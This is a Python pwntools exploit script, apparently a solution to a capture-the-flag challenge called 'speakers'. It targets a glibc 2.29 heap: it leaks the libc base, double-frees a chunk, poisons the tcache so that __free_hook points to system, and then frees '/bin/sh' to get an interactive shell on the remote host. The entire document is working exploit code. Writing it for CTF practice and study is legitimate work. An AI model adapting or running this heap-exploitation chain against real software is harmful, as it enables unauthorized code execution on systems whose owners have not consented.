#!/usr/bin/env python3

from pwn import *

END_PROMPT, PROMPT = b'\n1. ', b'> '

def create(idx: int, data: bytes, wait: bool = True) -> bytes:
    log.info(f'... create(idx={idx}, data={repr(data)})')
    p.sendlineafter(PROMPT, '1')
    p.sendlineafter('Which speaker ID? ', str(idx))
    p.sendlineafter('How long is the speaker name? ', str(len(data)))
    p.sendlineafter('What is the speaker\'s name? ', data)
    return p.recvuntil(END_PROMPT) if wait else b''

def delete(idx: int, wait: bool = True) -> bytes:
    log.info(f'... delete(idx={idx})')
    p.sendlineafter(PROMPT, '2')
    p.sendlineafter('Which speaker ID? ', str(idx))
    return p.recvuntil(END_PROMPT) if wait else b''

def view(idx: int) -> bytes:
    log.info(f'... view(idx={idx})')
    p.sendlineafter(PROMPT, '3')
    p.sendlineafter('Which speaker ID? ', str(idx))
    return p.recvuntil(b'\n' + END_PROMPT, drop = True)


if __name__ == '__main__':
    if '--local' not in sys.argv:
        log.info('Testing on remote...')
        p = remote('speakers.bsidespdxctf.party', 9999) # TODO: configure htis
    else:
        log.info('Testing locally (warning: your linker must use glibc 2.29)...')
        p = process(['./ld-2.29.so', './speakers'], env = {'LD_PRELOAD':'./libc-2.29.so'})

    log.success('Filling heap with 0x100 chunks for later use...')
    for i in range(7):
        create(i, b'A'*0x100)

    log.success('Preparing overlapping chunks...')
    create(8, b'C'*0x100) # will be consolidated
    create(9, b'V'*0x100) # victim chunk
    create(10, b'P'*0x10) # prevent top consolidation

    log.success('Filling up tcache bin...')
    for i in range(7):
        delete(i)

    log.success('Leaking the libc base address...')
    delete(9) # free victim chunk (put it in unsorted bin)
    libc_base = u64(view(9).ljust(8, b'\x00')) - 0x1e4ca0 # main_arena+96
    free_hook = libc_base + 0x1e75a8 - 8 # __free_hook-8
    system = libc_base + 0x52fd0 # none of the one_gadgets worked :(
    log.success(f'Calculated addresses:\n* glibc base: {hex(libc_base)}\n* system: {hex(system)}\n* free hook:  {hex(free_hook)}')

    log.success('Consolidating victim chunk with previous...')
    delete(8) # consolidate 8-9
    create(1, b'T'*0x100) # add to tcache list
    delete(9) # double free victim chunk

    log.success('Poisoning tcache...')
    create(1, b't'*(0x100-0x10) + p64(libc_base + 0x1e75a8 - 8)*8) # __free_hook-8
    create(2, b'T'*0x100) # consume first chunk from tcache bin
    create(2, (b'/bin/sh\x00' + p64(system)).ljust(0x100, b'\x00')) # this should be our target
    delete(2, wait = False) # now that we've overwritten the free hook, spawn shell

    log.info('Verifying we have a shell...')
    nonce = hex(u64(os.urandom(8)))
    p.sendline(f'echo {nonce}')
    if p.recvuntil(nonce, timeout = 3):
        log.success('Successfully popped shell. Going interactive...')
        p.interactive()
        exit(0)
    else:
        log.critical('Exploit detected no issues but did not pop a shell.')
        exit(1)

